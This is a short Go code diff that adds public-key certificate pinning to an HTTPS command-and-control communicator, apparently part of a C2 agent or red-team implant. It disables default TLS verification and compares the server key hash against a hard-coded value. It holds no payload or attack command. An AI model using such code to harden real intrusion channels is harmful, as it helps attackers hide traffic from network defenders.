@@ -6,6 +6,10 @@ import (
 	"fmt"
 	"net/http"
 	"time"
+	"crypto/sha256"
+	"crypto/tls"
+	"crypto/x509"
+	"encoding/base64"
 )
 
 type HTTPSC2TaskRequest struct {
@@ -21,9 +25,41 @@ type HTTPSC2Communicator struct {
 }
 
 func NewHTTPSC2Communicator() *HTTPSC2Communicator {
+	// Replace with your pinned public key hash
+	pinnedKey := "zEqbIbO2UKzMS+r9AsFvmchbzduA0R88nNt4SzVyudg="
+
+	// Create a custom TLS configuration
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true, // Disable default verification
+		VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+			print("Verifying certificate...\n")
+			// Extract the public key from the server's certificate
+			cert, err := x509.ParseCertificate(rawCerts[0])
+			if err != nil {
+				return err
+			}
+			publicKey := cert.PublicKey
+			publicKeyBytes, err := x509.MarshalPKIXPublicKey(publicKey)
+			if err != nil {
+				return err
+			}
+			hashedPublicKey := sha256.Sum256(publicKeyBytes)
+			encodedPublicKey := base64.StdEncoding.EncodeToString(hashedPublicKey[:])
+
+			// Compare the extracted public key with the pinned key
+			if encodedPublicKey != pinnedKey {
+				return fmt.Errorf("public key mismatch: expected %s, got %s", pinnedKey, encodedPublicKey)
+			}
+			return nil
+		},
+	}
+
 	return &HTTPSC2Communicator{
 		Client: &http.Client{
 			Timeout: time.Second * 10,
+			Transport: &http.Transport{
+				TLSClientConfig: tlsConfig,
+			},
 		},
 	}
 }
